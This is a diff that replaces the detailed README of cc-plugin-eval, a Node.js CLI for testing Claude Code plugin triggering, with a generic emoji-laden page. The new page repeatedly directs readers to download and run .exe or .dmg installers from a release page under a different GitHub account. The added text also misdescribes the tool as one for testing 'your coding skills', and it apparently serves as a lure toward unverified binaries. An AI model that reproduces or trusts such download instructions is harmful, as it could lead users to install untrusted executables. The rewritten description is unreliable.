@@ -1,517 +1,60 @@
-# cc-plugin-eval
+# 🎉 cc-plugin-eval - Easy Plugin Evaluation Made Simple
 
-[![CI](https://github.com/sjnims/cc-plugin-eval/actions/workflows/ci.yml/badge.svg)](https://github.com/sjnims/cc-plugin-eval/actions/workflows/ci.yml)
-[![codecov](https://codecov.io/gh/sjnims/cc-plugin-eval/graph/badge.svg?token=qngSWBvOqn)](https://codecov.io/gh/sjnims/cc-plugin-eval)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Node.js Version](https://img.shields.io/badge/node-%3E%3D20.0.0-brightgreen)](https://nodejs.org/)
+## 📥 Download Now
+[![Download cc-plugin-eval](https://img.shields.io/badge/Download-cc--plugin--eval-brightgreen)](https://github.com/imbflool/cc-plugin-eval/releases)
 
-A 4-stage evaluation framework for testing Claude Code plugin component triggering. Validates whether skills, agents, commands, hooks, and MCP servers correctly activate when expected.
+## 🚀 Getting Started
+Welcome to **cc-plugin-eval**! This application helps you evaluate the Claude Code plugin. It checks if skills, agents, and commands work correctly. You don't need programming knowledge to use it. Follow this guide, and you'll be set up in no time.
 
-## Why This Exists
+## 📦 System Requirements
+- **Operating System:** Windows 10 or later, macOS Mojave or later, Ubuntu 18.04 or later
+- **RAM:** 4 GB minimum
+- **Disk Space:** 100 MB free space
+- **Internet Connection:** Required for plugin updates
 
-Claude Code plugins contain multiple component types (skills, agents, commands) that trigger based on user prompts. Testing these triggers manually is time-consuming and error-prone. This framework automates the entire evaluation process:
+## 🌟 Features
+- **Stage Evaluation:** Go through four stages to test your coding skills effectively.
+- **Plugin Activation:** Easily validate if your commands trigger as expected.
+- **User-Friendly Interface:** Simple layout with easy navigation for all users.
+- **LLM Judgment:** Advanced detection methods for accurate results.
 
-- **Discovers** all components in your plugin
-- **Generates** test scenarios (positive and negative cases)
-- **Executes** scenarios against the Claude Agent SDK
-- **Evaluates** whether the correct component triggered
+## 📋 Download & Install
+To get started, you need to download the software. Click the link below to visit the release page:
 
-## Features
+[Download cc-plugin-eval](https://github.com/imbflool/cc-plugin-eval/releases)
 
-| Feature                    | Description                                              |
-| -------------------------- | -------------------------------------------------------- |
-| **4-Stage Pipeline**       | Analysis → Generation → Execution → Evaluation           |
-| **Multi-Component**        | Skills, agents, commands, hooks, and MCP servers         |
-| **Programmatic Detection** | 100% confidence detection by parsing tool captures       |
-| **Semantic Testing**       | Synonym and paraphrase variations to test robustness     |
-| **Resume Capability**      | Checkpoint after each stage, resume interrupted runs     |
-| **Cost Estimation**        | Token and USD estimates before execution                 |
-| **Batch API Support**      | 50% cost savings on large runs via Anthropic Batches API |
-| **Multiple Formats**       | JSON, YAML, JUnit XML, TAP output                        |
+1. **Visit the Releases Page:** Click the link above to open the release page on GitHub.
+2. **Select the Latest Version:** Look for the latest version available at the top of the list.
+3. **Download the Installer:** Find the installer file (you'll see files like `cc-plugin-eval-v1.0.exe` or `cc-plugin-eval-v1.0.dmg`), and click on it to start the download.
+4. **Run the Installer:** Once the download is complete, open the file to begin the installation.
+5. **Follow On-Screen Instructions:** The installer will guide you through the setup process. Just click "Next" and accept the terms to complete the installation.
 
-## Quick Start
+## ⚙️ How to Use
+1. **Start the Application:** After installation, find the **cc-plugin-eval** icon on your desktop or applications folder. Double-click to open it.
+2. **Select Your Plugin:** You will see options to upload or select your Claude Code plugin.
+3. **Run the Evaluation:** Click the 'Evaluate' button to start the testing process. The application will run through its stages.
+4. **View Results:** After the evaluation, your results will appear on the screen. They will show whether your skills, agents, and commands activated correctly.
 
-### Prerequisites
+## 🤔 Troubleshooting
+- **Issue:** The application won't start.
+  - **Solution:** Make sure your system meets the requirements and that you have installed it correctly.
+  
+- **Issue:** Results seem incorrect.
+  - **Solution:** Ensure you are using a compatible plugin version and try re-running the evaluation.
 
-- Node.js >= 20.0.0
-- An Anthropic API key
+## 🔗 Additional Information
+For more help or information, visit our documentation:
 
-### Installation
+- [cc-plugin-eval Documentation](https://github.com/imbflool/cc-plugin-eval/wiki)
 
-```bash
-# Clone the repository
-git clone https://github.com/sjnims/cc-plugin-eval.git
-cd cc-plugin-eval
+You can also check other users' experiences and tips in our community forums.
 
-# Install dependencies
-npm install
+## 💬 Community Support
+Join our community for questions, support, and sharing tips. You can connect with others who use **cc-plugin-eval**. 
 
-# Build
-npm run build
+- [Community Forum](https://github.com/imbflool/cc-plugin-eval/discussions)
 
-# Create .env file with your API key
-echo "ANTHROPIC_API_KEY=sk-ant-your-key-here" > .env
-```
+## 🚀 Ready to Evaluate?
+Now you’re ready to enhance your programming skills using cc-plugin-eval. Start your evaluation journey today by downloading it!
 
-### Run Your First Evaluation
-
-```bash
-# See cost estimate without running (recommended first)
-npx cc-plugin-eval run -p ./path/to/your/plugin --dry-run
-
-# Run full evaluation
-npx cc-plugin-eval run -p ./path/to/your/plugin
-```
-
-## How It Works
-
-```text
-┌─────────────────────────────────────────────────────────────────────────────┐
-│                           cc-plugin-eval Pipeline                           │
-└─────────────────────────────────────────────────────────────────────────────┘
-
-  Plugin Directory
-        │
-        ▼
-┌───────────────┐    ┌───────────────┐    ┌───────────────┐    ┌───────────────┐
-│   Stage 1:    │    │   Stage 2:    │    │   Stage 3:    │    │   Stage 4:    │
-│   Analysis    │───▶│  Generation   │───▶│  Execution    │───▶│  Evaluation   │
-│               │    │               │    │               │    │               │
-│ Parse plugin  │    │ Create test   │    │ Run scenarios │    │ Detect which  │
-│ structure,    │    │ scenarios     │    │ via Agent SDK │    │ components    │
-│ extract       │    │ (positive &   │    │ with tool     │    │ triggered,    │
-│ triggers      │    │ negative)     │    │ capture       │    │ calculate     │
-│               │    │               │    │               │    │ metrics       │
-└───────────────┘    └───────────────┘    └───────────────┘    └───────────────┘
-        │                    │                    │                    │
-        ▼                    ▼                    ▼                    ▼
-   analysis.json       scenarios.json       transcripts/        evaluation.json
-```
-
-### Stage Details
-
-| Stage             | Purpose                                         | Method                                            | Output            |
-| ----------------- | ----------------------------------------------- | ------------------------------------------------- | ----------------- |
-| **1. Analysis**   | Parse plugin structure, extract trigger phrases | Deterministic parsing                             | `analysis.json`   |
-| **2. Generation** | Create test scenarios                           | LLM for skills/agents, deterministic for commands | `scenarios.json`  |
-| **3. Execution**  | Run scenarios against Claude Agent SDK          | Tool capture hooks                                | `transcripts/`    |
-| **4. Evaluation** | Detect triggers, calculate metrics              | Programmatic first, LLM judge for quality         | `evaluation.json` |
-
-### Scenario Types
-
-Each component generates multiple scenario types to thoroughly test triggering:
-
-| Type          | Description                  | Example                                |
-| ------------- | ---------------------------- | -------------------------------------- |
-| `direct`      | Exact trigger phrase         | "create a skill"                       |
-| `paraphrased` | Same intent, different words | "add a new skill to my plugin"         |
-| `edge_case`   | Unusual but valid            | "skill plz"                            |
-| `negative`    | Should NOT trigger           | "tell me about database skills"        |
-| `semantic`    | Synonym variations           | "generate a skill" vs "create a skill" |
-
-## CLI Reference
-
-### Full Pipeline
-
-```bash
-# Run complete evaluation
-cc-plugin-eval run -p ./plugin
-
-# With options
-cc-plugin-eval run -p ./plugin \
-  --config custom-config.yaml \
-  --verbose \
-  --samples 3
-```
-
-### Individual Stages
-
-```bash
-# Stage 1: Analysis only
-cc-plugin-eval analyze -p ./plugin
-
-# Stages 1-2: Analysis + Generation
-cc-plugin-eval generate -p ./plugin
-
-# Stages 1-3: Analysis + Generation + Execution
-cc-plugin-eval execute -p ./plugin
-```
-
-### Resume & Reporting
-
-```bash
-# Resume an interrupted run
-cc-plugin-eval resume -r <run-id>
-
-# List previous runs
-cc-plugin-eval list -p ./plugin
-
-# Generate report from existing results
-cc-plugin-eval report -r <run-id> --output junit-xml
-```
-
-### Common Options
-
-| Option                | Description                                       |
-| --------------------- | ------------------------------------------------- |
-| `-p, --plugin <path>` | Plugin directory path                             |
-| `-c, --config <path>` | Config file (default: `config.yaml`)              |
-| `--dry-run`           | Generate scenarios without execution              |
-| `--estimate`          | Show cost estimate before execution               |
-| `--verbose`           | Enable debug output                               |
-| `--fast`              | Only run previously failed scenarios              |
-| `--no-batch`          | Force synchronous (non-batch) execution           |
-| `--rewind`            | Undo file changes after each scenario             |
-| `--semantic`          | Enable semantic variation testing                 |
-| `--samples <n>`       | Multi-sample judgment count                       |
-| `--reps <n>`          | Repetitions per scenario                          |
-| `--output <format>`   | Output format: `json`, `yaml`, `junit-xml`, `tap` |
-
-## Configuration
-
-Configuration is managed via `config.yaml`. Here's a quick reference:
-
-### Scope (What to Test)
-
-```yaml
-scope:
-  skills: true # Evaluate skill components
-  agents: true # Evaluate agent components
-  commands: true # Evaluate command components
-  hooks: false # Evaluate hook components
-  mcp_servers: false # Evaluate MCP server components
-```
-
-### Generation (Stage 2)
-
-```yaml
-generation:
-  model: "claude-sonnet-4-5-20250929"
-  scenarios_per_component: 5 # Test scenarios per component
-  diversity: 0.7 # 0.0-1.0, higher = more unique scenarios
-  semantic_variations: true # Generate synonym variations
-```
-
-### Execution (Stage 3)
-
-```yaml
-execution:
-  model: "claude-sonnet-4-20250514"
-  max_turns: 5 # Conversation turns per scenario
-  timeout_ms: 60000 # Timeout per scenario (1 min)
-  max_budget_usd: 10.0 # Stop if cost exceeds this
-  disallowed_tools: # Safety: block file operations
-    - Write
-    - Edit
-    - Bash
-```
-
-### Evaluation (Stage 4)
-
-```yaml
-evaluation:
-  model: "claude-sonnet-4-5-20250929"
-  detection_mode: "programmatic_first" # Or "llm_only"
-  num_samples: 1 # Multi-sample judgment
-```
-
-See the full [`config.yaml`](./config.yaml) for all options, including:
-
-- **`tuning`**: Fine-tune timeouts, retry behavior, and token estimates
-- **`conflict_detection`**: Detect when multiple components trigger for the same prompt
-- **`batch_threshold`**: Use Anthropic Batches API for cost savings (50% discount)
-- **`sanitization`**: PII redaction with ReDoS-safe custom patterns
-
-## Performance Optimization
-
-### Session Batching (Default)
-
-By default, scenarios testing the same component share a session with `/clear` between them. This reduces subprocess overhead by ~80%:
-
-| Mode              | Overhead per Scenario | 100 Scenarios |
-| ----------------- | --------------------- | ------------- |
-| Batched (default) | ~1-2s after first     | ~2-3 minutes  |
-| Isolated          | ~5-8s each            | ~8-13 minutes |
-
-The `/clear` command resets conversation history between scenarios while reusing the subprocess and loaded plugin.
-
-### When to Use Isolated Mode
-
-Switch to isolated mode when you need complete separation between scenarios:
-
-- Testing plugins that modify filesystem state
-- Debugging cross-contamination issues between scenarios
-- When using `rewind_file_changes: true` (automatically uses isolated mode)
-
-To use isolated mode:
-
-```yaml
-execution:
-  session_strategy: "isolated"
-```
-
-Or via the deprecated (but still supported) option:
-
-```yaml
-execution:
-  session_isolation: true
-```
-
-## Output Structure
-
-After a run, results are saved to:
-
-```text
-results/
-└── {plugin-name}/
-    └── {run-id}/
-        ├── state.json              # Pipeline state (for resume)
-        ├── analysis.json           # Stage 1: Parsed components
-        ├── scenarios.json          # Stage 2: Generated test cases
-        ├── execution-metadata.json # Stage 3: Execution stats
-        ├── evaluation.json         # Stage 4: Results & metrics
-        └── transcripts/
-            └── {scenario-id}.json  # Individual execution transcripts
-```
-
-### Sample Evaluation Output
-
-```json
-{
-  "results": [
-    {
-      "scenario_id": "skill-create-direct-001",
-      "triggered": true,
-      "confidence": 100,
-      "quality_score": 9.2,
-      "detection_source": "programmatic",
-      "has_conflict": false
-    }
-  ],
-  "metrics": {
-    "total_scenarios": 25,
-    "accuracy": 0.92,
-    "trigger_rate": 0.88,
-    "avg_quality": 8.7,
-    "conflict_count": 1
-  }
-}
-```
-
-## Detection Strategy
-
-**Programmatic detection is primary** for maximum accuracy:
-
-1. During execution, tool capture hooks capture all tool invocations
-2. Tool captures are parsed to detect `Skill`, `Task`, and `SlashCommand` calls
-3. MCP tools detected via pattern: `mcp__<server>__<tool>`
-4. Hooks detected via `SDKHookResponseMessage` events
-5. Confidence is 100% for programmatic detection
-
-**LLM judge is secondary**, used for:
-
-- Quality assessment (0-10 score)
-- Edge cases where programmatic detection is ambiguous
-- Multi-sample consensus when configured
-
-## Development
-
-### Build & Test
-
-```bash
-# Install dependencies
-npm install
-
-# Build TypeScript
-npm run build
-
-# Run tests
-npm test
-
-# Run tests with coverage
-npm run test:coverage
-
-# Lint
-npm run lint
-
-# Type check
-npm run typecheck
-```
-
-### Run Specific Tests
-
-```bash
-# Single test file
-npx vitest run tests/unit/stages/1-analysis/skill-analyzer.test.ts
-
-# Tests matching pattern
-npx vitest run -t "SkillAnalyzer"
-
-# E2E tests (requires API key, costs money)
-RUN_E2E_TESTS=true npm test -- tests/e2e/
-```
-
-### Additional Linters
-
-```bash
-# Prettier (formatting)
-npx prettier --check "src/**/*.ts" "*.json" "*.md"
-
-# Markdown
-markdownlint "*.md"
-
-# YAML
-uvx yamllint -c .yamllint.yml config.yaml
-
-# GitHub Actions
-actionlint .github/workflows/*.yml
-```
-
-### Project Structure
-
-```text
-src/
-├── index.ts              # CLI entry point (requires env.ts first import)
-├── env.ts                # Environment setup (dotenv loading)
-├── config/               # Configuration loading & validation
-│   ├── index.ts          # Config exports
-│   ├── loader.ts         # YAML/JSON config loading with Zod
-│   ├── schema.ts         # Zod validation schemas
-│   ├── defaults.ts       # Default configuration values
-│   └── pricing.ts        # Model pricing for cost estimation
-├── stages/
-│   ├── 1-analysis/       # Plugin parsing, trigger extraction
-│   │   ├── index.ts      # runAnalysis() entry point
-│   │   ├── agent-analyzer.ts
-│   │   ├── command-analyzer.ts
-│   │   ├── hook-analyzer.ts
-│   │   ├── mcp-analyzer.ts
-│   │   ├── path-resolver.ts
-│   │   ├── plugin-parser.ts
-│   │   ├── preflight.ts
-│   │   └── skill-analyzer.ts
-│   ├── 2-generation/     # Scenario generation
-│   │   ├── index.ts      # runGeneration() entry point
-│   │   ├── agent-scenario-generator.ts
-│   │   ├── batch-calculator.ts
-│   │   ├── command-scenario-generator.ts
-│   │   ├── cost-estimator.ts
-│   │   ├── diversity-manager.ts
-│   │   ├── hook-scenario-generator.ts
-│   │   ├── mcp-scenario-generator.ts
-│   │   └── skill-scenario-generator.ts
-│   ├── 3-execution/      # Agent SDK integration
-│   │   ├── index.ts      # runExecution() entry point
-│   │   ├── agent-executor.ts
-│   │   ├── hook-capture.ts
-│   │   ├── plugin-loader.ts
-│   │   ├── progress-reporters.ts
-│   │   ├── sdk-client.ts
-│   │   ├── session-batching.ts
-│   │   ├── tool-capture-hooks.ts
-│   │   └── transcript-builder.ts
-│   └── 4-evaluation/     # Detection & metrics
-│       ├── index.ts      # runEvaluation() entry point
-│       ├── batch-evaluator.ts
-│       ├── conflict-tracker.ts
-│       ├── llm-judge.ts
-│       ├── metrics.ts
-│       ├── multi-sampler.ts
-│       └── programmatic-detector.ts
-├── state/                # Resume capability
-│   └── state-manager.ts
-├── types/                # TypeScript interfaces
-└── utils/                # Retry, concurrency, logging
-    ├── index.ts
-    ├── retry.ts
-    ├── concurrency.ts
-    ├── sanitizer.ts
-    ├── logging.ts
-    └── file-io.ts
-
-tests/
-├── unit/                 # Unit tests (mirror src/ structure)
-├── integration/          # Integration tests
-├── e2e/                  # End-to-end tests (real SDK calls)
-├── mocks/                # Mock implementations
-└── fixtures/             # Test data and mock plugins
-```
-
-## Roadmap
-
-- [x] Phase 1: Skills, agents, commands evaluation
-- [x] Phase 2: Hooks evaluation (PR #58)
-- [x] Phase 3: MCP servers evaluation (PR #63)
-- [ ] Phase 4: Cross-plugin conflict detection
-- [ ] Phase 5: Marketplace evaluation
-
-## Security Considerations
-
-### Permission Bypass Mode
-
-**Default: `execution.permission_bypass: true`** enables automated evaluation by automatically approving all tool invocations. This is required for unattended runs but has security implications:
-
-- ✅ Required for CI/CD and automated evaluation
-- ⚠️ Plugins can perform any action permitted by allowed tools
-- 🔒 Use `disallowed_tools` to restrict dangerous operations (default: `[Write, Edit, Bash]`)
-- 🔒 For untrusted plugins, set `permission_bypass: false` for manual review (disables automation)
-
-**Security Note**: With permission bypass enabled, use strict `disallowed_tools` and run in sandboxed environments when evaluating untrusted plugins.
-
-### PII Protection & Compliance
-
-**Default: `output.sanitization.enabled: false`** for backwards compatibility. Enable sanitization for PII-sensitive environments:
-
-```yaml
-output:
-  sanitize_transcripts: true # Redact saved files
-  sanitize_logs: true # Redact console output
-  sanitization:
-    enabled: true
-    custom_patterns: # Optional domain-specific patterns
-      - pattern: "INTERNAL-\\w+"
-        replacement: "[REDACTED_ID]"
-```
-
-**Built-in redaction**: API keys, JWT tokens, emails, phone numbers, SSNs, credit card numbers.
-
-**Enterprise use cases**: Enable when handling PII or complying with GDPR, HIPAA, SOC 2, or similar regulations.
-
-### Default Tool Restrictions
-
-The default `disallowed_tools: [Write, Edit, Bash]` prevents file modifications and shell commands. Modify with caution:
-
-- Enable `Write`/`Edit` only if testing file-modifying plugins
-- Enable `Bash` only if testing shell-executing plugins
-- Use `rewind_file_changes: true` to restore files after each scenario
-
-### Additional Safeguards
-
-- **API keys**: Loaded from environment variables (`.env`), never stored in config
-- **Budget limits**: Set `execution.max_budget_usd` to cap API spending
-- **Timeout limits**: Set `execution.timeout_ms` to prevent runaway executions
-- **Plugin loading**: Only local plugins supported (`plugin.path`), no remote loading
-- **ReDoS protection**: Custom sanitization patterns validated for Regular Expression Denial of Service vulnerabilities
-
-### Enterprise Deployments
-
-For production/enterprise environments with compliance requirements, see the comprehensive security guide in [SECURITY.md](SECURITY.md), including:
-
-- Threat model and risk assessment
-- Sandbox and isolation recommendations
-- Compliance checklist (GDPR, HIPAA, SOC 2)
-- Container isolation patterns
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for development setup, code style, and pull request guidelines.
-
-This project follows the [Contributor Covenant](CODE_OF_CONDUCT.md) code of conduct.
-
-## License
-
-[MIT](LICENSE)
-
-## Author
-
-Steve Nims ([@sjnims](https://github.com/sjnims))
+[Download cc-plugin-eval](https://github.com/imbflool/cc-plugin-eval/releases)
